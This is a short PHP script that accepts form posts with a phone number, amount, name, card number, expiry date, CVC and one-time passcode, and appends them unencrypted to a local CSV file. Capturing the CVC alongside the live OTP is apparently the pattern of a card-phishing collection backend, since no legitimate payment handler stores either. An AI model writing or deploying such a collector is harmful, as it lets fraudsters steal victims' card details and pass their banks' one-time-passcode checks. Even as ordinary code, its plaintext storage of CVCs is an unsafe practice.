<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $file = __DIR__ . '/data.csv';
    
    // Input validation and sanitization
    $phone = isset($_POST['phone']) ? filter_var($_POST['phone'], FILTER_SANITIZE_STRING) : '';
    $amount = isset($_POST['amount']) ? filter_var($_POST['amount'], FILTER_VALIDATE_FLOAT) : '';
    $name = isset($_POST['name']) ? filter_var($_POST['name'], FILTER_SANITIZE_STRING) : '';
    $card_number = isset($_POST['card_number']) ? filter_var($_POST['card_number'], FILTER_SANITIZE_STRING) : '';
    $expiry = isset($_POST['expiry']) ? filter_var($_POST['expiry'], FILTER_SANITIZE_STRING) : '';
    $cvc = isset($_POST['cvc']) ? filter_var($_POST['cvc'], FILTER_SANITIZE_STRING) : '';
    $otp = isset($_POST['otp']) ? filter_var($_POST['otp'], FILTER_SANITIZE_STRING) : '';
    
    // Additional validation
    if (empty($phone) || empty($amount) || empty($name)) {
        http_response_code(400);
        echo 'error: missing required fields';
        exit;
    }
    
    // Validate phone number format
    if (!preg_match('/^[0-9+\-\s()]+$/', $phone)) {
        http_response_code(400);
        echo 'error: invalid phone number format';
        exit;
    }
    
    // Validate amount is positive
    if ($amount === false || $amount <= 0) {
        http_response_code(400);
        echo 'error: invalid amount';
        exit;
    }
    
    $data = [
        date('Y-m-d H:i:s'),
        $phone,
        $amount,
        $name,
        $card_number,
        $expiry,
        $cvc,
        $otp
    ];
    
    // Use proper file locking to prevent race conditions
    $fp = fopen($file, 'a');
    if ($fp && flock($fp, LOCK_EX)) {
        fputcsv($fp, $data);
        flock($fp, LOCK_UN);
        fclose($fp);
        echo 'success';
    } else {
        http_response_code(500);
        echo 'error: unable to save data';
    }
} else {
    http_response_code(405);
    echo 'error: method not allowed';
}
?>
